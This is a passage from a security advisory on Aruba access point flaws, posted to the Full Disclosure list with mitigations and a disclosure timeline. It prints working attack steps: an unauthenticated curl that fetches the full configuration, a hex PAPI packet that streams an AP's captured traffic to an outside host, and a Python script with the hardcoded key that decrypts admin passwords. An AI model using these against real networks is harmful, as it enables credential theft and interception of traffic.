+  [...]msg_ref 2689 http://10.0.0.26/.cli_msg_n011xh
+
+Downloading the file referenced by the reply returns the full AP configuration,
+including all users, passwords and settings (no auth is required on the HTTP
+request either):
+
+  # curl -Lk http://10.0.0.26/.cli_msg_n011xh
+  version 6.4.2.0-4.1.1
+  virtual-controller-country XX
+  virtual-controller-key b49ff***REMOVED***
+  name instant-XX:XX:XX
+  terminal-access
+  clock timezone none 00 00
+  rf-band all
+  [...]
+  mgmt-user admin f9ac59cd431e174fb07539a8a811a1aa
+  [...]
+  (full configuration file continues)
+
+For APs running in "managed mode", the above shown exploit does not work. The
+reason for that is, that these APs don't provide a web server and have only a
+limited set of commands that can be executed via PAPI.
+
+Additionally, APs in managed mode do not seem to use the XOR based "encryption"
+or MD5 checksums - there was no authentication/encryption found at all.
+
+One interesting payload for APs in "managed mode" using the limited subset of
+available commands is the ability to capture traffic and send it to a remote
+endpoint via UDP. The example command on the controller would be:
+
+  (aruba_7030_1) #ap packet-capture raw-start ip-addr 192.168.0.1
+100.105.134.45 1337 0 radio 0
+
+This command would send all traffic of AP 192.168.0.1 from the first radio
+interface in PCAP format to 100.105.134.45:1337. Wrapped in PAPI, the Packet
+would look like this:
+
+  0000  49 72 00 03 c0 a8 00 01 7f 00 00 01 00 00 00 00   Ir..............
+  0010  20 21 20 1c 20 04 01 48 14 08 36 b1 00 00 00 00    ! . ..H..6.....
+  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 14 65   ...............e
+  0050  78 65 63 75 74 65 43 6f 6d 6d 61 6e 64 4f 62 6a   xecuteCommandObj
+  0060  65 63 74 02 06 02 04 03 00 08 03 00 08 00 00 04   ect.............
+  0070  38 32 32 35 02 06 02 04 00 00 00 03 00 00 02 00   8225............
+  0080  02 01 04 00 00 00 08 00 00 02 41 50 00 00 02 41   ..........AP...A
+  0090  50 00 00 0e 50 41 43 4b 45 54 2d 43 41 50 54 55   P...PACKET-CAPTU
+  00a0  52 45 00 00 0e 50 41 43 4b 45 54 2d 43 41 50 54   RE...PACKET-CAPT
+  00b0  55 52 45 00 00 09 52 41 57 2d 53 54 41 52 54 00   URE...RAW-START.
+  00c0  00 09 52 41 57 2d 53 54 41 52 54 00 00 07 49 50   ..RAW-START...IP
+  00d0  2d 41 44 44 52 00 00 0b 31 39 32 2e 31 36 38 2e   -ADDR...192.168.
+  00e0  30 2e 31 00 00 09 74 61 72 67 65 74 2d 69 70 00   0.1...target-ip.
+  00f0  00 0e 31 30 30 2e 31 30 35 2e 31 33 34 2e 34 35   ..100.105.134.45
+  0100  00 00 0b 74 61 72 67 65 74 2d 70 6f 72 74 00 00   ...target-port..
+  0110  04 31 33 33 37 00 00 06 66 6f 72 6d 61 74 00 00   .1337...format..
+  0120  01 30 00 00 05 52 41 44 49 4f 00 00 01 30 04 00   .0...RADIO...0..
+  0130  00 00 00 02 00 02 01 02 00 02 00 00 00 04 73 65   ..............se
+  0140  63 61 00 00 04 72 6f 6f 74                        ca...root
+
+When sending this packet to an AP running in managed mode, it confirms the
+command and starts sending traffic to the specified host:
+
+  [...]<re><data name="Packet capture has started for pcap-id"
+pn="true">1</data></re>
+
+---------------------------------------------------------
+25. AP: Broadcast with detailed system information (LLDP)
+---------------------------------------------------------
+
+Aruba APs broadcast detailed system and version information to the wired
+networks via LLDP (Link Layer Discovery Protocol).
+
+  0000   02 07 04 00 0b 86 9e 7a 32 04 07 03 00 0b 86 9e  .......z2.......
+  0010   7a 32 06 02 00 78 0a 11 30 30 3a 30 62 3a 38 36  z2...x..00:0b:86
+  0020   3a XX XX 3a XX XX 3a XX XX 0c 3a 41 72 75 62 61  :XX:XX:XX.:Aruba
+  0030   4f 53 20 28 4d 4f 44 45 4c 3a 20 52 41 50 2d 31  OS (MODEL: RAP-1
+  0040   35 35 29 2c 20 56 65 72 73 69 6f 6e 20 36 2e 34  55), Version 6.4
+  0050   2e 32 2e 36 2d 34 2e 31 2e 31 2e 31 30 20 28 35  .2.6-4.1.1.10 (5
+  0060   31 38 31 30 29 0e 04 00 0c 00 08 10 0c 05 01 0a  1810)...........
+  0070   00 00 22 02 00 00 00 0e 00 08 04 65 74 68 30 fe  .."........eth0.
+  0080   06 00 0b 86 01 00 01 fe 09 00 12 0f 03 00 00 00  ................
+  0090   00 00 fe 09 00 12 0f 01 03 6c 03 00 10 fe 06 00  .........l......
+  00a0   12 0f 04 06 76 00 00                             ....v..
+
+The broadcast packet contains the APs MAC address, model number and exact
+firmware version.This detailed information could aid an attacker to easily find
+and identify potential targets for known vulnerabilities.
+
+------------------------------------------------------
+26. AP: User passwords are encrypted with a static key
+------------------------------------------------------
+
+Based on the vulnerability shown in #24 which potentially discloses the
+password hashes of AP user accounts, the implemented hashing algorithm was
+tested. CVE-2014-7299 describes the password hashes as "encrypted password
+hashes". The following line shows the mgmt-user configuration for the user
+"admin" with password "admin":
+
+  mgmt-user admin f9ac59cd431e174fb07539a8a811a1aa
+
+Some testing with various passwords and especially password lengths showed that
+the passwords are actually encrypted and not hashed (as hash algorithms produce
+the same length output for different length input):
+
+  f9ac59cd431e174fb07539a8a811a1aa                 # admin
+  d7a75c655b8e2fb8609d0b04275e02767f2dfae8c63088cf # adminadmin
+
+The encryption algorithm used for the above passwords turned out to be 3DES in
+CBC mode. The encryption algorithm uses a 24 byte static key which is hardcoded
+on the AP. Sampling of different Firmware versions confirmed that the key is
+identical for all available versions. The IV required for 3DES consists of 8
+random bytes, and is stored as the first 8 byte of the encrypted password. The
+following Python script can be used to decrypt the above hashes:
+
+  import pyDes
+  hashes = (
+    'f9ac59cd431e174fb07539a8a811a1aa', # admin
+    'd7a75c655b8e2fb8609d0b04275e02767f2dfae8c63088cf' # adminadmin
+  )
+  key = (
+    '\x32\x74\x10\x84\x91\x17\x75\x46\x14\x75\x82\x92'
+    '\x43\x49\x04\x59\x18\x69\x15\x94\x27\x84\x30\x03'
+  )
+  for h in hashes:
+    d = pyDes.triple_des(key, pyDes.CBC, h.decode('hex')[:8], pad='\00')
+    print h, '=>', d.decrypt(h.decode('hex')[8:])
+
+Mitigation
+==========
+Aruba released three advisories, related to the issues reported here:
+
+  http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2016-004.txt
+  http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2016-005.txt
+  http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2016-006.txt
+
+Following the resolution advises given in those advisories is strongly
+recommended. These advisories are also available on the Aruba security bulletin:
+
+  http://www.arubanetworks.com/support-services/security-bulletins/
+
+For the vulnerabilities related to PAPI, Aruba has made the following document
+available:
+
+  http://community.arubanetworks.com/aruba/attachments/aruba/aaa-nac-guest-access-byod/25840/1/Control_Plane_Security_Best_Practices_1_0.pdf
+
+This doc gives several advises how to remediate the PAPI related
+vulnerabilities. An update fixing the issues is announced for Q3/2016.
+For further information there is also a discussion thread in Aruba's Airheads
+Community Forum:
+
+  http://community.arubanetworks.com/t5/AAA-NAC-Guest-Access-BYOD/Security-vulnerability-advisories/m-p/266095#M25840
+
+Author
+======
+The vulnerabilities were discovered by Sven Blumenstein from Google Security
+Team.
+
+
+Timeline
+========
+2016/01/22 - Security report sent to sirt@...banetworks.com with 90 day
+             disclosure deadline (2016/04/22).
+2016/01/22 - Aruba acknowledges report and starts working on the issues.
+2016/02/01 - Asking Aruba for ETA on detailed feedback.
+2016/02/03 - Detailed feedback for all reported vulnerabilities received.
+2016/02/16 - Answered several questions from the feedback, asked Aruba for
+             patch ETA.
+2016/02/29 - Pinged for patch ETA.
+2016/03/08 - Pinged for patch ETA.
+2016/03/12 - Received detailed list with approx. ETA for patch releases and
+             current status.
+2016/03/21 - Aruba asks for extension of 90 day disclosure deadline.
+2016/03/24 - Asked Aruba for exact patch release dates.
+2016/04/02 - Aruba confirmed 4.2.x branch update for 2016/04/15, 4.1.x branch
+             update for 2016/04/30 (past 90 day deadline).
+2016/04/14 - 14 day grace period for disclosure was granted, according to
+             the disclosure policy. New disclosure date was set to 2016/05/06.
+2016/05/02 - Asking for status of still unreleased 'end of April' update.
+2016/05/02 - Aruba confirmed availability of update on 2016/05/09 (after grace
+             period).
+2016/05/03 - Aruba released three advisories on
+http://www.arubanetworks.com/support-services/security-bulletins/
+2016/05/06 - Public disclosure.
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
